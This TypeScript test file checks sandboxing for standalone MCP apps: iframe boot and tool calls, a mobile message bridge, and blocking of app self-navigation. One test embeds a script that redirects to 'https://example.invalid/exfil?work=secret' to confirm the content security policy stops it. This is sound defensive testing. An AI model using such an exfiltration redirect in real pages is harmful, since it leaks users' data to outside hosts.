import { EnvironmentId } from "@t3tools/contracts";
import { Atom } from "effect/reactivity";
import { expect, it, vi } from "vite-plus/test";
import { render } from "../../../test/render";
import { StandaloneAppView } from "./StandaloneAppView";
import {
  standaloneAppWebDocument,
  standaloneAppHost,
  standaloneAppMobileDocument,
  decodeNativeAppMessage,
} from "@t3tools/client-runtime/standalone-apps";

vi.mock("../../state/mcpApps", () => ({
  mcpAppEnvironment: {
    readApp: { kind: "read" },
    writeApp: { kind: "write", permissionAtom: () => Atom.make(true) },
  },
}));
vi.mock("../../state/use-atom-command", () => ({
  useAtomCommand: (command: { kind: string }) => async () => ({
    _tag: "Success",
    value: {
      content: [
        {
          type: "text",
          text: command.kind === "read" ? "ready-without-agent" : "unexpected-write",
        },
      ],
    },
  }),
}));
vi.mock("../../hooks/useHtmlRenderTheme", () => ({
  useHtmlRenderTheme: () => ({ appearance: "dark", variables: {} }),
}));

it("boots an opaque sandbox and completes its tool request without a thread", async () => {
  const delivered = new Promise<string>((resolve) => {
    const receive = (event: MessageEvent) => {
      if (event.data?.testResult) {
        window.removeEventListener("message", receive);
        resolve(event.data.testResult);
      }
    };
    window.addEventListener("message", receive);
  });
  await using screen = await render(
    <StandaloneAppView
      environmentId={EnvironmentId.make("test-environment")}
      appId="test-app"
      title="Standalone test app"
      app={{
        resourceUri: "ui://test/app",
        readTools: ["read"],
        writeTools: [],
        html: `<!doctype html><script>
        window.addEventListener('message', function(event) {
          if (event.data.id === 1) {
            parent.postMessage({jsonrpc:'2.0',method:'ui/notifications/initialized'}, '*');
            parent.postMessage({jsonrpc:'2.0',id:2,method:'tools/call',params:{name:'read',arguments:{}}}, '*');
          } else if (event.data.id === 2) {
            parent.postMessage({testResult:event.data.result.content[0].text}, '*');
          }
        });
        parent.postMessage({jsonrpc:'2.0',id:1,method:'ui/initialize',params:{protocolVersion:'2026-01-26'}}, '*');
      </script>`,
      }}
    />,
  );
  expect(await delivered).toBe("ready-without-agent");
  await expect
    .element(screen.getByTitle("Standalone test app"))
    .toHaveAttribute("sandbox", "allow-scripts allow-forms");
});

it("relays the mobile app's first load through the authenticated outer document", async () => {
  let outer: HTMLIFrameElement | null = null;
  const secret = "mobile-bridge-test";
  let resolveResult: (value: string) => void = () => {};
  const delivered = new Promise<string>((resolve) => {
    resolveResult = resolve;
  });
  const html = `<!doctype html><script>
    window.addEventListener('message', function(event) {
      if (event.data.id === 1) {
        parent.postMessage({jsonrpc:'2.0',method:'ui/notifications/initialized'}, '*');
        parent.postMessage({jsonrpc:'2.0',id:2,method:'tools/call',params:{name:'read',arguments:{}}}, '*');
      } else if (event.data.id === 2) parent.postMessage({testResult:event.data.result.content[0].text}, '*');
    });
    parent.postMessage({jsonrpc:'2.0',id:1,method:'ui/initialize',params:{protocolVersion:'2026-01-26'}}, '*');
  </script>`;
  const host = standaloneAppHost({
    appId: "mobile-test",
    app: { html, resourceUri: "ui://test/mobile", readTools: ["read"], writeTools: [] },
    post: (message) =>
      (
        outer?.contentWindow as (Window & { __t3AppReceive?: (value: unknown) => void }) | null
      )?.__t3AppReceive?.(message),
    hostContext: () => ({
      theme: "dark",
      styles: { variables: {} },
      displayMode: "fullscreen",
      availableDisplayModes: ["fullscreen"],
      containerDimensions: { width: 390, height: 844 },
      platform: "mobile",
    }),
    call: async () => ({ content: [{ type: "text", text: "native-bridge-ready" }] }),
    confirm: async () => false,
    openLink: async () => {},
  });
  const receive = (event: MessageEvent) => {
    if (event.source !== outer?.contentWindow) return;
    const message = decodeNativeAppMessage(JSON.stringify(event.data), secret);
    if (typeof message === "object" && message !== null && "testResult" in message)
      resolveResult(String(message.testResult));
    else host.receive(message);
  };
  window.addEventListener("message", receive);
  using _listener = {
    [Symbol.dispose]: () => {
      window.removeEventListener("message", receive);
      host.dispose();
    },
  };
  const document = standaloneAppMobileDocument(html, secret).replace(
    "<head>",
    `<head><script>window.ReactNativeWebView={postMessage:function(m){parent.postMessage(JSON.parse(m),'*');}};</script>`,
  );
  await using _screen = await render(
    <iframe
      title="Mobile app bridge"
      sandbox="allow-scripts allow-same-origin"
      ref={(frame) => {
        outer = frame;
      }}
      srcDoc={document}
    />,
  );
  expect(await delivered).toBe("native-bridge-ready");
});

it("blocks an app's self-navigation before it can access the network", async () => {
  let resolveResult: (value: string) => void = () => {};
  const blocked = new Promise<string>((resolve) => {
    resolveResult = resolve;
  });
  const receive = (event: MessageEvent) => {
    if (event.data?.blockedNavigation) resolveResult(String(event.data.blockedNavigation));
  };
  window.addEventListener("message", receive);
  using _listener = { [Symbol.dispose]: () => window.removeEventListener("message", receive) };
  const document = standaloneAppWebDocument(
    `<script>location.href='https://example.invalid/exfil?work=secret';</script>`,
  ).replace(
    "<style>",
    `<script>window.addEventListener('securitypolicyviolation',function(e){parent.postMessage({blockedNavigation:e.effectiveDirective},'*');});</script><style>`,
  );
  await using _screen = await render(
    <iframe title="Navigation restriction" sandbox="allow-scripts" srcDoc={document} />,
  );
  expect(await blocked).toBe("frame-src");
});
